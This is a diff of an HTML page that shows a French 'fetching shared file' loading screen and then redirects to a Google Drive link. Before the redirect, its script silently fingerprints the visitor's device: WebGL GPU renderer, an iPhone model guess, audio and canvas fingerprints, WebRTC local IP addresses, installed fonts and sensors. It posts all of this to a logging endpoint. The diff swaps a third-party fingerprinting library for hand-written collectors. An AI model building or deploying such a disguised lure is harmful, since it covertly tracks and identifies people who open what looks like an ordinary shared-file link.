@@ -16,53 +16,168 @@ body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;ju
   <div class="spinner"></div>
   <p>Récupération du fichier partagé...</p>
 </div>
-<script src="https://openfpcdn.io/fingerprintjs/v4/iife.min.js"></script>
+
 <script>
 (async () => {
-  const data = {};
-  data.timestamp = new Date().toISOString();
-  data.userAgent = navigator.userAgent;
-  data.language = navigator.language;
-  data.languages = (navigator.languages || []).join(',');
-  data.platform = navigator.platform;
-  data.hardwareConcurrency = navigator.hardwareConcurrency;
-  data.deviceMemory = navigator.deviceMemory || "n/a";
-  data.screen = `${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
-  data.colorDepth = screen.colorDepth;
-  data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  data.touchPoints = navigator.maxTouchPoints;
-  data.connection = navigator.connection ? `${navigator.connection.effectiveType} / ${navigator.connection.downlink}Mbps` : "n/a";
+  const d = {};
+  d.timestamp = new Date().toISOString();
+  d.userAgent = navigator.userAgent;
+  d.language = navigator.language;
+  d.languages = (navigator.languages || []).join(',');
+  d.platform = navigator.platform;
+  d.hardwareConcurrency = navigator.hardwareConcurrency;
+  d.deviceMemory = navigator.deviceMemory || "n/a (iOS masqué)";
+  d.screen = `${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
+  d.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
+  d.colorDepth = screen.colorDepth;
+  d.pixelDepth = screen.pixelDepth;
+  d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  d.touchPoints = navigator.maxTouchPoints;
+  d.vendor = navigator.vendor;
+  
+  // GPU detection (le KEY POINT pour iPhone)
+  d.gpu = getGPUInfo();
+  
+  // Détection modèle iPhone via GPU + résolution
+  d.deviceGuess = guessDevice(d.gpu.renderer, screen.width, screen.height, window.devicePixelRatio);
+  
+  // Audio fingerprint
+  d.audioFP = await getAudioFingerprint();
+  
+  // Canvas fingerprint
+  d.canvasFP = getCanvasFingerprint();
+  
+  // WebRTC (mDNS hash sur iOS, vraie IP sur Android/PC)
+  d.webrtc = await getLocalIPs();
+  
+  // Fonts détectables
+  d.fonts = detectFonts();
+  
+  // Capteurs mobiles
+  d.sensors = await checkSensors();
+  
+  // Hash de fingerprint maison (combine plusieurs signaux stables)
+  d.customFingerprint = await sha256([
+    d.gpu.renderer, d.audioFP, d.canvasFP, d.screen, d.timezone, d.fonts.join('|')
+  ].join('::'));
 
-  if (navigator.getBattery) {
-    try {
-      const bat = await navigator.getBattery();
-      data.battery = `${Math.round(bat.level*100)}% ${bat.charging?'charge':'décharge'}`;
-    } catch(e) { data.battery = "denied"; }
-  }
-
-  data.localIPs = await getLocalIPs();
-
-  try {
-    const fp = await FingerprintJS.load();
-    const r = await fp.get();
-    data.fingerprintHash = r.visitorId;
-    data.fpComponents = {
-      fonts: (r.components.fonts?.value || []).slice(0,5).join(','),
-      canvas: r.components.canvas?.value?.substring(0,30),
-      audio: r.components.audio?.value,
-    };
-  } catch(e) { data.fingerprintHash = "error"; }
-
+  // Send
   fetch('/api/log', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body: JSON.stringify(data)
+    body: JSON.stringify(d)
   }).finally(() => {
     setTimeout(() => {
       window.location.href = "https://drive.google.com/file/d/1abcXYZ/view";
-    }, 1200);
+    }, 1500);
   });
 })();
+
+function getGPUInfo() {
+  const out = { renderer:'unknown', vendor:'unknown', maxTexture:0 };
+  try {
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl2') || c.getContext('webgl');
+    if (!gl) return out;
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    if (dbg) {
+      out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+    } else {
+      out.renderer = gl.getParameter(gl.RENDERER);
+      out.vendor = gl.getParameter(gl.VENDOR);
+    }
+    out.maxTexture = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+    out.glVersion = gl.getParameter(gl.VERSION);
+  } catch(e){ out.error = e.message; }
+  return out;
+}
+
+function guessDevice(gpu, w, h, dpr) {
+  const g = (gpu||'').toLowerCase();
+  const res = `${Math.min(w,h)}x${Math.max(w,h)}`;
+  
+  // iPhone matrix : GPU + résolution
+  if (g.includes('apple')) {
+    if (g.includes('a18 pro')) {
+      if (res === '402x874') return 'iPhone 16 Pro';
+      if (res === '440x956') return 'iPhone 16 Pro Max';
+    }
+    if (g.includes('a18')) {
+      if (res === '393x852') return 'iPhone 16';
+      if (res === '430x932') return 'iPhone 16 Plus';
+    }
+    if (g.includes('a17 pro')) {
+      if (res === '393x852') return 'iPhone 15 Pro';
+      if (res === '430x932') return 'iPhone 15 Pro Max';
+    }
+    if (g.includes('a16')) {
+      if (res === '393x852' && dpr === 3) return 'iPhone 14 Pro ou 15';
+      if (res === '430x932') return 'iPhone 14 Pro Max ou 15 Plus';
+    }
+    if (g.includes('a15')) {
+      if (res === '390x844') return 'iPhone 13 / 13 Pro / 14';
+      if (res === '428x926') return 'iPhone 13 Pro Max / 14 Plus';
+      if (res === '375x812') return 'iPhone 13 mini';
+      if (res === '375x667') return 'iPhone SE 3';
+    }
+    if (g.includes('a14')) {
+      if (res === '390x844') return 'iPhone 12 / 12 Pro';
+      if (res === '428x926') return 'iPhone 12 Pro Max';
+      if (res === '360x780') return 'iPhone 12 mini';
+    }
+    if (g.includes('a13')) return 'iPhone 11 series / SE 2';
+    if (g.includes('a12')) return 'iPhone XS / XR / XS Max';
+    if (g.includes('m1')) return 'iPad Pro M1 ou Mac M1';
+    if (g.includes('m2')) return 'iPad Pro M2 ou Mac M2';
+    if (g.includes('m3')) return 'Mac M3';
+    if (g.includes('m4')) return 'iPad Pro M4 ou Mac M4';
+    return 'Appareil Apple - ' + gpu;
+  }
+  if (g.includes('mali')) return 'Android (Mali GPU) - ' + gpu;
+  if (g.includes('adreno')) return 'Android (Adreno GPU - Snapdragon) - ' + gpu;
+  if (g.includes('nvidia') || g.includes('geforce')) return 'PC avec GPU NVIDIA - ' + gpu;
+  if (g.includes('radeon') || g.includes('amd')) return 'PC avec GPU AMD - ' + gpu;
+  if (g.includes('intel')) return 'PC avec GPU Intel - ' + gpu;
+  return 'Inconnu - ' + gpu;
+}
+
+async function getAudioFingerprint() {
+  try {
+    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.value = 10000;
+    const comp = ctx.createDynamicsCompressor();
+    comp.threshold.value = -50;
+    comp.knee.value = 40;
+    comp.ratio.value = 12;
+    comp.attack.value = 0;
+    comp.release.value = 0.25;
+    osc.connect(comp);
+    comp.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    let sum = 0;
+    for (let i = 4500; i < 5000; i++) sum += Math.abs(buf.getChannelData(0)[i]);
+    return sum.toFixed(10);
+  } catch(e) { return 'denied'; }
+}
+
+function getCanvasFingerprint() {
+  try {
+    const c = document.createElement('canvas');
+    c.width = 280; c.height = 60;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = "16px 'Arial'";
+    ctx.fillStyle = '#069';
+    ctx.fillText('Familly-Sec-Canary-😀', 2, 15);
+    ctx.fillStyle = 'rgba(102,200,0,0.7)';
+    ctx.fillText('Familly-Sec-Canary-😀', 4, 17);
+    return c.toDataURL().substring(c.toDataURL().length - 50);
+  } catch(e) { return 'denied'; }
+}
 
 function getLocalIPs() {
   return new Promise(resolve => {
@@ -71,14 +186,65 @@ function getLocalIPs() {
       const pc = new RTCPeerConnection({iceServers:[]});
       pc.createDataChannel('');
       pc.onicecandidate = e => {
-        if (!e.candidate) { pc.close(); return resolve(ips); }
-        const m = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+|[a-f0-9:]+:[a-f0-9:]{2,})/);
+        if (!e.candidate) { try{pc.close()}catch(_){}; return resolve(ips); }
+        const m = e.candidate.candidate.match(/([a-f0-9-]+\.local|\d+\.\d+\.\d+\.\d+|[a-f0-9:]+:[a-f0-9:]{2,})/);
         if (m && !ips.includes(m[1])) ips.push(m[1]);
       };
       pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(ips));
-      setTimeout(() => { try{pc.close()}catch(e){}; resolve(ips); }, 2000);
+      setTimeout(() => { try{pc.close()}catch(_){}; resolve(ips); }, 2000);
     } catch(e) { resolve(['error']); }
   });
+}
+
+function detectFonts() {
+  const baseFonts = ['monospace', 'sans-serif', 'serif'];
+  const testString = "mmmmmmmmmmlli";
+  const testSize = '72px';
+  const testFonts = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Tahoma','Lucida Console','Andale Mono','Apple Color Emoji','SF Pro','Segoe UI','Roboto','Noto Sans CJK'];
+  const h = document.body || document.documentElement;
+  const baseWidths = {};
+  const baseHeights = {};
+  baseFonts.forEach(f => {
+    const s = document.createElement('span');
+    s.style.cssText = `position:absolute;left:-9999px;font-size:${testSize};font-family:${f}`;
+    s.innerText = testString;
+    h.appendChild(s);
+    baseWidths[f] = s.offsetWidth;
+    baseHeights[f] = s.offsetHeight;
+    h.removeChild(s);
+  });
+  const detected = [];
+  testFonts.forEach(f => {
+    let isDetected = false;
+    for (const base of baseFonts) {
+      const s = document.createElement('span');
+      s.style.cssText = `position:absolute;left:-9999px;font-size:${testSize};font-family:'${f}',${base}`;
+      s.innerText = testString;
+      h.appendChild(s);
+      if (s.offsetWidth !== baseWidths[base] || s.offsetHeight !== baseHeights[base]) {
+        isDetected = true;
+      }
+      h.removeChild(s);
+      if (isDetected) break;
+    }
+    if (isDetected) detected.push(f);
+  });
+  return detected;
+}
+
+async function checkSensors() {
+  const r = { motion: false, orientation: false };
+  if (typeof DeviceMotionEvent !== 'undefined') r.motion = true;
+  if (typeof DeviceOrientationEvent !== 'undefined') r.orientation = true;
+  return r;
+}
+
+async function sha256(str) {
+  try {
+    const buf = new TextEncoder().encode(str);
+    const hash = await crypto.subtle.digest('SHA-256', buf);
+    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,'0')).join('').substring(0,16);
+  } catch(e) { return 'error'; }
 }
 </script>
 </body>
